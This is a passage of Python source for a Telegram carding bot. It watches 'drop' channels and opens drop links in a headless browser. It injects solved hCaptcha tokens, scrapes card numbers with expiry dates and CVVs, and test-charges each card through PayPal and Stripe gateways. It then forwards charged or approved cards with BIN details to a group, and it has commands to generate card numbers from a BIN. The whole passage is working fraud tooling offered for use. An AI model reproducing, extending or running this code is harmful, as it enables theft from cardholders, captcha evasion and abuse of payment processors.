                        const event = new Event('submit', {{ bubbles: true }});
                        captchaElem.dispatchEvent(event);
                    }}
                    if (typeof hcaptcha !== 'undefined' && hcaptcha.submit) {{
                        hcaptcha.submit(response);
                    }}
                }}
            """)
            self._log("captcha", "hCaptcha token injected ✅")
            await page.wait_for_timeout(3000)
            return True
        except Exception as e:
            self._log("captcha", f"Bright Data solver error: {e}")
            return False

    async def extract_card_from_page(self, page):
        try:
            await page.wait_for_timeout(3000)
            content = await page.content()
            long_match = re.search(r'(\d{15,16})\|(\d{2})\|(\d{3,4})\|([A-Za-z ]+)\|', content)
            if long_match:
                card = long_match.group(1)
                mm = long_match.group(2)
                cvv = long_match.group(3)
                year_match = re.search(rf'{re.escape(card)}\|\d{{2}}\|\d{{3,4}}\|.*?\|(\d{{2,4}})', content)
                if year_match:
                    yy = year_match.group(1)
                    if len(yy) == 2:
                        yy = f"20{yy}"
                    return (card, mm, yy, cvv)
            for pattern in [CARD_RE_SIMPLE, CARD_RE_LOOSE]:
                match = pattern.search(content)
                if match:
                    groups = match.groups()
                    if len(groups) >= 4:
                        return groups
                    elif len(groups) >= 3:
                        return (groups[0], groups[1], groups[2], "000")
            return None
        except Exception as e:
            self._log("extract", f"ERROR: {e}")
            return None

    async def _get_drop_url_from_button(self, event):
        msg = event.message
        if not msg.reply_markup:
            return None
        for row in msg.reply_markup.rows:
            for btn in row.buttons:
                if hasattr(btn, 'text') and "View Drop" in btn.text:
                    if hasattr(btn, 'url') and btn.url:
                        self._log("click", f"Found View Drop URL: {btn.url[:100]}")
                        return btn.url
        return None

    async def _click_telegram_interstitial_button(self, page):
        selectors = [
            'a:has-text("OPEN APP")',
            'button:has-text("OPEN APP")',
            'a:has-text("Open App")',
            'button:has-text("Open App")',
            'a:has-text("LAUNCH")',
            'button:has-text("LAUNCH")',
            'a[href*="tgWebAppData"]',
        ]
        for sel in selectors:
            try:
                btn = await page.query_selector(sel)
                if btn and await btn.is_visible():
                    self._log("browser", f"Clicking interstitial button: {sel}")
                    await btn.click()
                    await page.wait_for_timeout(3000)
                    return True
            except Exception:
                continue
        try:
            buttons = await page.query_selector_all('button, a')
            for btn in buttons:
                text = (await btn.inner_text()).strip().lower()
                if text in ["open app", "open", "launch", "start"]:
                    self._log("browser", f"Clicking button with text: '{text}'")
                    await btn.click()
                    await page.wait_for_timeout(3000)
                    return True
        except Exception:
            pass
        return False

    async def _click_page_action_buttons(self, page):
        if not PLAYWRIGHT_OK: return False
        selectors = ['button:has-text("Get")', 'button:has-text("Claim")', 'button:has-text("Show")',
                     'button:has-text("Reveal")', 'button:has-text("Open")', 'button:has-text("Visit")',
                     'button:has-text("View")', 'button:has-text("Drop")', 'a:has-text("Get")', 'a:has-text("Claim")',
                     'a:has-text("Show")', 'a:has-text("Reveal")', '.btn-primary', '.btn-main', '.btn-action']
        for sel in selectors:
            try:
                el = await page.query_selector(sel)
                if el and await el.is_visible():
                    txt = (await el.inner_text()).strip()[:40]
                    self._log("browser", f"Clicking page button: '{txt}'")
                    await el.click()
                    return True
            except: continue
        return False

    def _ensure_worker(self):
        if self._worker_task is None or self._worker_task.done():
            self._worker_task = asyncio.ensure_future(self._queue_worker())
            self._log("queue", "Drop queue worker started")

    async def _queue_worker(self):
        self._log("queue", "Worker ready — waiting for drops...")
        while True:
            try:
                url, tg_script = await self._drop_queue.get()
                depth = self._drop_queue.qsize()
                self._log("queue", f"Processing drop ({depth} remaining): {url[:70]}")
                await self._run_browser_session(url, tg_script)
            except asyncio.CancelledError:
                self._log("queue", "Worker cancelled — exiting")
                break
            except Exception as e:
                self._log("queue", f"Worker error: {e}")
            finally:
                try: self._drop_queue.task_done()
                except: pass

    async def _run_browser_session(self, url, tg_script):
        if not PLAYWRIGHT_OK or not PLAYWRIGHT_EXECUTABLE_PATH:
            self._log("browser", "Playwright not available")
            return
        self._log("browser", f"Launching browser for: {url[:80]}")
        _saved_ldpath = os.environ.pop("LD_LIBRARY_PATH", None)
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(
                    headless=True,
                    executable_path=PLAYWRIGHT_EXECUTABLE_PATH,
                    args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"]
                )
                context = await browser.new_context(
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
                    viewport={"width": 390, "height": 844}
                )
                await context.add_init_script(tg_script)
                page = await context.new_page()
                await page.goto(url, wait_until="domcontentloaded", timeout=60000)
                self._log("browser", f"Page loaded: {page.url[:80]}")
                await self._save_screenshot(page, "page_loaded")

                interstitial_clicked = await self._click_telegram_interstitial_button(page)
                if interstitial_clicked:
                    self._log("browser", "Clicked 'OPEN APP' button, waiting for drop page...")
                    await page.wait_for_timeout(5000)
                    await self._save_screenshot(page, "after_interstitial")

                clicked = await self._click_page_action_buttons(page)
                if clicked:
                    self._log("browser", "Action button clicked — waiting for captcha...")
                    await page.wait_for_timeout(2000)

                solved = await self.solve_hcaptcha_brightdata(page)
                if solved:
                    self._log("captcha", "hCaptcha solved successfully")
                else:
                    self._log("captcha", "hCaptcha solving failed, continuing anyway")

                await page.wait_for_timeout(5000)
                card_data = await self.extract_card_from_page(page)
                if not card_data:
                    self._log("browser", "No card after first extraction, retrying...")
                    await page.wait_for_timeout(8000)
                    card_data = await self.extract_card_from_page(page)

                if card_data:
                    n, mm, yy, cvv = card_data[0], card_data[1], card_data[2], (card_data[3] or "000")
                    card_hash = hashlib.md5(f"{n}|{mm}|{yy}|{cvv}".encode()).hexdigest()
                    if card_hash in self.processed_cards:
                        self._log("browser", f"Duplicate card {n[:4]}...{n[-4:]}")
                    else:
                        self.processed_cards.add(card_hash)
                        self._save_state()
                        self._log("browser", f"Card extracted: {n[:4]}...{n[-4:]} | {mm}/{yy} | CVV:{cvv}")
                        await self.check_and_forward_card(n, mm, yy, cvv)
                else:
                    self._log("browser", "No card found after all attempts")
                    await self._save_screenshot(page, "no_card_found")
                await browser.close()
        except Exception as e:
            self._log("browser", f"Session error: {e}")
            try:
                await self._save_screenshot(page, "session_error")
            except Exception:
                pass
        finally:
            if _saved_ldpath is not None:
                os.environ["LD_LIBRARY_PATH"] = _saved_ldpath

    async def process_message_with_button(self, event):
        url = await self._get_drop_url_from_button(event)
        if not url:
            self._log("queue", "No valid drop URL from button")
            return
        if url in self.processed_links:
            self._log("queue", f"Already processed: {url[:60]}")
            return
        self.processed_links.add(url)
        self._save_state()
        await self._drop_queue.put((url, "// No extra script needed"))
        self._ensure_worker()

    async def on_message(self, event):
        text = event.raw_text or ""
        chat = getattr(event.chat, "title", None) or getattr(event.chat, "username", "?")
        sender = getattr(event.sender, "username", None) or getattr(event.sender, "id", "?")
        self._log("msg", f"[{chat}] from @{sender}: {text[:120].strip()!r}")

        # Check for “View Drop” button in the message
        if "View Drop" in text or "VIEW DROP" in text.upper():
            msg = event.message
            if msg and msg.reply_markup:
                self._log("msg", "Detected 'View Drop' button – extracting URL")
                await self.process_message_with_button(event)
                return

        # Also check for “Open Drop” button (some groups use that directly)
        if "Open Drop" in text:
            msg = event.message
            if msg and msg.reply_markup:
                self._log("msg", "Detected 'Open Drop' button – extracting URL")
                await self.process_message_with_button(event)
                return

        # If Playwright is ready, also scan for any http/t.me links that might be drops
        if PLAYWRIGHT_OK:
            links = self._extract_links_from_event(event)
            if links:
                self._log("msg", f"Found {len(links)} link(s): {links}")
                from_xforce_bot = str(getattr(event.sender, "username", "")).lower() in ("xforcedropbot", "xforcedropsbot")
                for link in links:
                    if "?startapp=" in link or from_xforce_bot:
                        self._log("queue", f"Queuing drop link: {link[:90]}")
                        await self.process_link(link)
                    else:
                        self._log("msg", f"Skipping non-drop link: {link[:90]}")
            else:
                # No links, but maybe the message itself contains a card (drop text)
                card_tuple = extract_card_from_text(text)
                if card_tuple:
                    self._log("msg", "Found card in message text – forwarding")
                    n, mm, yy, cvv = card_tuple
                    await self.check_and_forward_card(n, mm, yy, cvv)
        else:
            # Playwright not ready – still extract cards from plain text
            card_tuple = extract_card_from_text(text)
            if card_tuple:
                self._log("msg", "Found card in message text – forwarding (Playwright disabled)")
                n, mm, yy, cvv = card_tuple
                await self.check_and_forward_card(n, mm, yy, cvv)

    async def process_link(self, link, pending_id=None):
        if not PLAYWRIGHT_OK:
            self._log("queue", "Playwright unavailable – ignoring drop link")
            return
        if link in self.processed_links:
            self._log("queue", f"Already queued/processed — skipping")
            return
        self.processed_links.add(link)
        self._save_state()
        await self._drop_queue.put((link, "// No extra script needed"))
        self._ensure_worker()

    async def check_and_forward_card(self, n, mm, yy, cvv):
        card_str = f"{n}|{mm}|{yy}|{cvv}"
        self._log("checker", f"Running PayPal check on {n[:4]}...{n[-4:]}")
        loop = asyncio.get_event_loop()
        paypal_result = await loop.run_in_executor(None, PayPalCharger(proxy=ProxyManager.get()).charge, card_str)
        bin_info = await get_bin_info(n[:6])
        if paypal_result.startswith("CHARGED"): status = "CHARGED 💰"
        elif paypal_result.startswith("APPROVED"): status = "APPROVED 🟢"
        elif paypal_result.startswith("DECLINED"): status = "DECLINED 🔴"
        else: status = "ERROR ⚠️"
        response_text = paypal_result.split("|",1)[-1] if "|" in paypal_result else paypal_result
        msg = f"┏━━━━━━━⍟\n┃ {status}\n┗━━━━━━━━━━━⊛\n[❃] 𝗖𝗮𝗿𝗱    ➜ `{card_str}`\n[❃] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➜ PayPal\n[❃] 𝗥𝗲𝘀𝗽    ➜ {response_text}\n"
        if bin_info:
            msg += f"┏━━━━━━━⍟\n┃ BIN INFO 🔍\n┗━━━━━━━━━━━⊛\n[❃] 𝗕𝗿𝗮𝗻𝗱  ➜ {bin_info.get('brand','UNKNOWN')}\n[❃] 𝗧𝘆𝗽𝗲   ➜ {bin_info.get('type','UNKNOWN')}\n[❃] 𝗕𝗮𝗻𝗸   ➜ {bin_info.get('bank','Unknown')}\n[❃] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆➜ {bin_info.get('country','Unknown')}\n[❃] 𝗟𝗲𝘃𝗲𝗹  ➜ {bin_info.get('level','STANDARD')}\n[❃] 𝗙𝗶𝗿𝘀𝘁𝟲➜ {n[:6]}\n[❃] 𝗟𝗮𝘀𝘁𝟰 ➜ {n[-4:]}\n"
        try:
            await self.bot_client.send_message(self.target_group, msg)
            self._log("forward", f"✅ Forwarded {n[:4]}...{n[-4:]}")
        except Exception as e:
            self._log("forward", f"ERROR: {e}")

    def _extract_links_from_event(self, event):
        links = []
        text = event.raw_text or ""
        for m in re.finditer(r'https?://[^\s\)\]>"\']+', text):
            links.append(m.group(0).rstrip(".,;)>\"'"))
        for m in re.finditer(r't\.me/[^\s\)\]>"\']+', text):
            url = "https://" + m.group(0).rstrip(".,;)>\"'")
            if url not in links:
                links.append(url)
        msg = event.message
        if msg and msg.reply_markup:
            try:
                for row in msg.reply_markup.rows:
                    for btn in row.buttons:
                        url = getattr(btn, "url", None)
                        if url and url.startswith("http") and url not in links:
                            links.append(url)
            except Exception:
                pass
        return links

# ======================================================================
# Main bot logic (commands, group joining)
# ======================================================================
async def find_entity_by_title(title: str):
    title_lower = title.lower()
    async for dialog in client.iter_dialogs():
        if hasattr(dialog.entity, "title") and dialog.entity.title:
            if title_lower in dialog.entity.title.lower():
                return dialog.entity
    return None

async def join_and_resolve(chat: str):
    if chat.startswith("+") or "t.me/+" in chat or "joinchat" in chat:
        invite = chat.lstrip("+")
        if "t.me/+" in chat: invite = chat.split("t.me/+")[-1]
        elif "joinchat/" in chat: invite = chat.split("joinchat/")[-1]
        try:
            result = await client(ImportChatInviteRequest(invite))
            return result.chats[0]
        except UserAlreadyParticipantError:
            try:
                info = await client(CheckChatInviteRequest(hash=invite))
                chat_obj = getattr(info, 'chat', None)
                if chat_obj:
                    print(f"[OK] Already in group: {getattr(chat_obj, 'title', invite)}")
                    return chat_obj
            except: pass
            async for dialog in client.iter_dialogs():
                e = dialog.entity
                if getattr(e, 'megagroup', False) or getattr(e, 'broadcast', False):
                    return e
            return None
        except Exception as e:
            logger.error(f"Join failed for {chat}: {e}")
            return None
    else:
        try: return await client.get_entity(chat)
        except: pass
        entity = await find_entity_by_title(chat)
        if entity: return entity
        logger.error(f"Resolve failed for: {chat}")
        return None

async def run_scraper():
    await client.start()
    print(f"[🤖 {BOT_USERNAME}] Bot online")
    print(f"📡 Watching: {SOURCE_CHATS_RAW}")
    print(f"📤 Forwarding to: {FORWARD_TARGET}")
    if not PLAYWRIGHT_OK:
        print("[WARN] Playwright missing – xForce drop automation disabled. Card forwarding from other groups still works.")
    resolved = []
    for chat in SOURCE_CHATS_RAW:
        entity = await join_and_resolve(chat)
        if entity:
            resolved.append(entity)
            title = getattr(entity, 'title', None) or getattr(entity, 'username', chat)
            print(f"[OK] Watching: {title}")
        else:
            print(f"[WARN] Could not resolve: {chat}")
    if not resolved:
        print("[ERROR] No channels resolved.")
        return

    xforce = XForceAutomator(client, FORWARD_TARGET)

    # Override the check_and_forward_card to use the global client (for commands)
    async def global_check_and_forward_card(n, mm, yy, cvv):
        card_str = f"{n}|{mm}|{yy}|{cvv}"
        card_hash = hashlib.md5(card_str.encode()).hexdigest()
        if card_hash in xforce.processed_cards:
            return
        xforce.processed_cards.add(card_hash)
        if len(xforce.processed_cards) > 1000:
            xforce.processed_cards.clear()
        loop = asyncio.get_event_loop()
        paypal_result = await loop.run_in_executor(None, PayPalCharger(proxy=ProxyManager.get()).charge, card_str)
        bin_info = await get_bin_info(n[:6])
        if paypal_result.startswith("CHARGED"): status = "CHARGED 💰"
        elif paypal_result.startswith("APPROVED"): status = "APPROVED 🟢"
        elif paypal_result.startswith("DECLINED"): status = "DECLINED 🔴"
        else: status = "ERROR ⚠️"
        response_text = paypal_result.split("|",1)[-1] if "|" in paypal_result else paypal_result
        msg = f"┏━━━━━━━⍟\n┃ {status}\n┗━━━━━━━━━━━⊛\n[❃] 𝗖𝗮𝗿𝗱    ➜ `{card_str}`\n[❃] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➜ PayPal\n[❃] 𝗥𝗲𝘀𝗽    ➜ {response_text}\n"
        if bin_info:
            msg += f"┏━━━━━━━⍟\n┃ BIN INFO 🔍\n┗━━━━━━━━━━━⊛\n[❃] 𝗕𝗿𝗮𝗻𝗱  ➜ {bin_info.get('brand','UNKNOWN')}\n[❃] 𝗧𝘆𝗽𝗲   ➜ {bin_info.get('type','UNKNOWN')}\n[❃] 𝗕𝗮𝗻𝗸   ➜ {bin_info.get('bank','Unknown')}\n[❃] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆➜ {bin_info.get('country','Unknown')}\n[❃] 𝗟𝗲𝘃𝗲𝗹  ➜ {bin_info.get('level','STANDARD')}\n[❃] 𝗙𝗶𝗿𝘀𝘁𝟲➜ {n[:6]}\n[❃] 𝗟𝗮𝘀𝘁𝟰 ➜ {n[-4:]}\n"
        try:
            await client.send_message(FORWARD_TARGET, msg)
            print(f"[📤] Forwarded card {n[:4]}...{n[-4:]} → {FORWARD_TARGET}")
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds)
        except Exception as e:
            logger.error(f"Forward error: {e}")
    xforce.check_and_forward_card = global_check_and_forward_card

    async def handle_all_messages(event):
        text = event.raw_text or ""
        # First, try to extract card from the message text (inline drop)
        card_tuple = extract_card_from_text(text)
        if card_tuple:
            n, mm, yy, cvv = card_tuple
            await global_check_and_forward_card(n, mm, yy, cvv)
        # Then let xForce handler process buttons and links
        await xforce.on_message(event)

    async def handle_xforce_private(event):
        await xforce.on_message(event)

    client.add_event_handler(handle_all_messages, events.NewMessage(chats=resolved))
    client.add_event_handler(handle_xforce_private, events.NewMessage(chats=[XFORCE_BOT_USERNAME], incoming=True))

    # Commands
    async def handle_commands(event):
        text = (event.raw_text or "").strip()
        parts = text.split(None, 2)
        cmd = parts[0].lower().lstrip("/").split("@")[0]
        args = parts[1] if len(parts) > 1 else ""

        if cmd == "help":
            await event.reply("🤖 **Commands**\n\n`/gen <BIN> [count]`\n`/bin <BIN>`\n`/st CC|MM|YY|CVV`\n`/chkpp CC|MM|YY|CVV`\n`/drop CC|MM|YY|CVV`\n`/status`\n`/addchat <username or invite>`\n`/removechat <username or invite>`\n`/clearchat`\n`/help`")
        elif cmd == "status":
            qsize = xforce._drop_queue.qsize() if xforce else 0
            pw = "✅ ready" if PLAYWRIGHT_OK else "❌ disabled"
            msg = f"📊 **Status**\n\nPlaywright: {pw}\nQueue depth: {qsize}\nLinks processed: {len(xforce.processed_links) if xforce else 0}\nCards extracted: {len(xforce.processed_cards) if xforce else 0}"
            await event.reply(msg)
        elif cmd == "clearchat":
            try: await client.delete_messages(event.chat_id, event.message.id)
            except: pass
            await event.reply("\n" * 50 + "🧹 Chat cleared (visually).")
        elif cmd == "gen":
            args_parts = args.strip().split()
            if not args_parts:
                await event.reply("Usage: `/gen 414720` or `/gen 414720 10`")
                return
            bin_prefix = args_parts[0][:6]
            if not bin_prefix.isdigit():
                await event.reply("Invalid BIN")
                return
            count = 1
            if len(args_parts) > 1:
                try: count = min(int(args_parts[1]), 100)
                except: count = 1
            bin_info = await get_bin_info(bin_prefix) if len(bin_prefix) >= 6 else None
            cards = [generate_card_with_bin(bin_prefix) for _ in range(count)]
            if bin_info:
                header = f"┏━━━━━━━⍟\n┃ GENERATED {count} CARD{'S' if count>1 else ''} 💳\n┗━━━━━━━━━━━⊛\n[❃] 𝗕𝗿𝗮𝗻𝗱  ➜ {bin_info.get('brand','?')}\n[❃] 𝗧𝘆𝗽𝗲   ➜ {bin_info.get('type','?')}\n[❃] 𝗕𝗮𝗻𝗸   ➜ {bin_info.get('bank','?')}\n[❃] 𝗟𝗲𝘃𝗲𝗹  ➜ {bin_info.get('level','?')}\n[❃] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆➜ {bin_info.get('country','?')}\n[❃] 𝗙𝗶𝗿𝘀𝘁𝟲➜ {bin_prefix}\n\n"
            else:
                header = f"┏━━━━━━━⍟\n┃ GENERATED {count} CARD{'S' if count>1 else ''} 💳\n┗━━━━━━━━━━━⊛\n"
            card_lines = [f"[{i}] `{card}`" for i, card in enumerate(cards, 1)]
            full_msg = header + "\n".join(card_lines)
            if len(full_msg) > 4000:
                await event.reply(header + "\n".join(card_lines[:30]))
                if count > 30:
                    await event.reply("\n".join(card_lines[30:]))
            else:
                await event.reply(full_msg)
        elif cmd == "bin":
            if not args:
                await event.reply("Usage: `/bin 414720`")
                return
            raw_digits = re.findall(r'\d{6,}', args)
            bins = list(dict.fromkeys(d[:6] for d in raw_digits))
            if not bins:
                await event.reply("No valid BINs")
                return
            status_msg = await event.reply(f"🔍 Looking up {len(bins)} BIN(s)...")
            results = await asyncio.gather(*[get_bin_info(b) for b in bins])
            lines = []
            for b, info in zip(bins, results):
                if not info: lines.append(f"`{b}` — ❌ Not found")
                else:
                    flag = {"US":"🇺🇸","GB":"🇬🇧","CA":"🇨🇦","AU":"🇦🇺","DE":"🇩🇪","FR":"🇫🇷"}.get(info.get("country_code",""), "🌐")
                    prepaid = " [PREPAID]" if info.get("prepaid") else ""
                    lines.append(f"`{b}` {flag} {info.get('brand','?')} {info.get('type','?')}{prepaid} — {info.get('bank','Unknown')} | {info.get('country','Unknown')}")
            chunk = []
            for line in lines:
                chunk.append(line)
                if len("\n".join(chunk)) > 3800:
                    await status_msg.edit("\n".join(chunk[:-1]))
                    chunk = [chunk[-1]]
            await status_msg.edit(f"┏━━━━━━━⍟\n┃ BIN LOOKUP 🔍 ({len(bins)} BINs)\n┗━━━━━━━━━━━⊛\n" + "\n".join(chunk))
        elif cmd == "st":
            if not args:
                await event.reply("Usage: `/st CC|MM|YY|CVV`")
                return
            card = args.strip()
            if len(card.split("|")) < 4:
                await event.reply("Format: `CC|MM|YY|CVV`")
                return
            status_msg = await event.reply("🔄 Checking card with Stripe...")
            loop = asyncio.get_event_loop()
            result = await loop.run_in_executor(None, stripe_authorize, card)
            parts_result = result.split("|", 1)
            status = parts_result[0]
            message = parts_result[1] if len(parts_result) > 1 else ""
            n = card.split("|")[0]
            bin_info = await get_bin_info(n[:6]) if len(n) >= 6 else None
            msg = f"┏━━━━━━━⍟\n┃ {status}\n┗━━━━━━━━━━━⊛\n[❃] 𝗖𝗮𝗿𝗱    ➜ `{card}`\n[❃] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➜ Stripe\n[❃] 𝗥𝗲𝘀𝗽    ➜ {message}\n"
            if bin_info:
                msg += f"[❃] 𝗕𝗿𝗮𝗻𝗱  ➜ {bin_info.get('brand','?')}\n[❃] 𝗧𝘆𝗽𝗲   ➜ {bin_info.get('type','?')}\n[❃] 𝗕𝗮𝗻𝗸   ➜ {bin_info.get('bank','?')}\n[❃] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆➜ {bin_info.get('country','?')}\n"
            await status_msg.edit(msg)
        elif cmd == "chkpp":
            if not args:
                await event.reply("Usage: `/chkpp CC|MM|YY|CVV`")
                return
            card = args.strip()
            if len(card.split("|")) < 4:
                await event.reply("Format: `CC|MM|YY|CVV`")
                return
            n = card.split("|")[0]
            status_msg = await event.reply("🔄 Checking card with PayPal...")
            loop = asyncio.get_event_loop()
            paypal_result = await loop.run_in_executor(None, PayPalCharger(proxy=ProxyManager.get()).charge, card)
            bin_info = await get_bin_info(n[:6]) if len(n) >= 6 else None
            if paypal_result.startswith("CHARGED"): status = "CHARGED 💰"
            elif paypal_result.startswith("APPROVED"): status = "APPROVED 🟢"
            elif paypal_result.startswith("DECLINED"): status = "DECLINED 🔴"
            else: status = "ERROR ⚠️"
            response_text = paypal_result.split("|",1)[-1] if "|" in paypal_result else paypal_result
            msg = f"┏━━━━━━━⍟\n┃ {status}\n┗━━━━━━━━━━━⊛\n[❃] 𝗖𝗮𝗿𝗱    ➜ `{card}`\n[❃] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➜ PayPal\n[❃] 𝗥𝗲𝘀𝗽    ➜ {response_text}\n"
            if bin_info:
                msg += f"[❃] 𝗕𝗿𝗮𝗻𝗱  ➜ {bin_info.get('brand','?')}\n[❃] 𝗧𝘆𝗽𝗲   ➜ {bin_info.get('type','?')}\n[❃] 𝗕𝗮𝗻𝗸   ➜ {bin_info.get('bank','?')}\n[❃] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆➜ {bin_info.get('country','?')}\n"
            await status_msg.edit(msg)
        elif cmd == "drop":
            card_text = args.strip()
            card_tuple = extract_card_from_text(card_text)
            if not card_tuple:
                await event.reply("Usage: `/drop CC|MM|YY|CVV`\nExample: `/drop 4147200149830900|05|27|345`")
                return
            n, mm, yy, cvv = card_tuple
            card_str = f"{n}|{mm}|{yy}|{cvv}"
            bin_info = await get_bin_info(n[:6]) if len(n) >= 6 else None
            msg = f"┏━━━━━━━⍟\n┃ DROPPED 📝\n┗━━━━━━━━━━━⊛\n[❃] 𝗖𝗮𝗿𝗱    ➜ `{card_str}`\n[❃] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➜ Dropped by user\n[❃] 𝗥𝗲𝘀𝗽    ➜ Will be checked\n"
            if bin_info:
                msg += f"┏━━━━━━━⍟\n┃ BIN INFO 🔍\n┗━━━━━━━━━━━⊛\n[❃] 𝗕𝗿𝗮𝗻𝗱  ➜ {bin_info.get('brand','UNKNOWN')}\n[❃] 𝗧𝘆𝗽𝗲   ➜ {bin_info.get('type','UNKNOWN')}\n[❃] 𝗕𝗮𝗻𝗸   ➜ {bin_info.get('bank','Unknown')}\n[❃] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆➜ {bin_info.get('country','Unknown')}\n[❃] 𝗟𝗲𝘃𝗲𝗹  ➜ {bin_info.get('level','STANDARD')}\n[❃] 𝗙𝗶𝗿𝘀𝘁𝟲➜ {n[:6]}\n[❃] 𝗟𝗮𝘀𝘁𝟰 ➜ {n[-4:]}\n"
            await event.reply(msg)
            await global_check_and_forward_card(n, mm, yy, cvv)
        elif cmd == "addchat":
            if not args:
                await event.reply("Usage: `/addchat <username or invite link>`")
                return
            chat_arg = args.strip()
            if chat_arg in SOURCE_CHATS_RAW:
                await event.reply(f"⚠️ Already watching `{chat_arg}`")
                return
            entity = await join_and_resolve(chat_arg)
            if entity:
                SOURCE_CHATS_RAW.append(chat_arg)
                _save_watched_chats(SOURCE_CHATS_RAW)
                resolved.append(entity)
                title = getattr(entity, 'title', None) or getattr(entity, 'username', chat_arg)
                client.add_event_handler(handle_all_messages, events.NewMessage(chats=[entity]))
                await event.reply(f"✅ Added `{chat_arg}` (\u201c{title}\u201d) to watched chats.\n📁 Total: {len(SOURCE_CHATS_RAW)}")
            else:
                await event.reply(f"❌ Could not resolve `{chat_arg}`. Check the username or invite link.")
        elif cmd == "removechat":
            if not args:
                await event.reply("Usage: `/removechat <username or invite link>`")
                return
            chat_arg = args.strip()
            if chat_arg not in SOURCE_CHATS_RAW:
                await event.reply(f"⚠️ `{chat_arg}` is not in watched chats.")
                return
            SOURCE_CHATS_RAW.remove(chat_arg)
            _save_watched_chats(SOURCE_CHATS_RAW)
            await event.reply(f"✅ Removed `{chat_arg}` from watched chats.\n📁 Total: {len(SOURCE_CHATS_RAW)}")

    client.add_event_handler(handle_commands, events.NewMessage(outgoing=True, pattern=r'^/(help|gen|bin|st|chkpp|clearchat|drop|status|addchat|removechat)\b'))
    print(f"[✅] Listening for new messages in {len(resolved)} chat(s)...")
    await client.run_until_disconnected()

async def _notify(msg: str):
    try:
        if client.is_connected():
            await client.send_message(FORWARD_TARGET, msg)
    except: pass

async def watchdog():
    if RUN_MODE in ("both", "scraper"):
        first_run = True
        while True:
            try:
                if not first_run:
                    ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
                    await _notify(f"🔄 *Bot Restarted*\n⏰ {ts}\n✅ Scraper back online.")
                first_run = False
                await run_scraper()
            except Exception as e:
                ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
                err_str = str(e)[:300]
                logger.error(f"Scraper crashed: {e}")
                print(f"[ERROR] Scraper crashed: {e}")
                await _notify(f"🚨 *Bot Crashed*\n⏰ {ts}\n❌ Error: `{err_str}`\n♻️ Restarting in 30 seconds...")
                await asyncio.sleep(30)

if __name__ == "__main__":
    if RUN_MODE == "web":
        run_flask()
    else:
        if RUN_MODE in ("both", "web"):
            _ft = Thread(target=run_flask, daemon=True)
            _ft.start()
            print(f"[🌐] Flask server on port {PORT}")
        def _bg_playwright():
            global PLAYWRIGHT_OK
            result = setup_playwright()
            if result:
                PLAYWRIGHT_OK = True
                print("[OK] Playwright ready – xForce drop automation enabled.")
            else:
                print("[WARN] Playwright not available. xForce drops will be disabled.")
        _pt = Thread(target=_bg_playwright, daemon=True)
        _pt.start()
        asyncio.run(watchdog())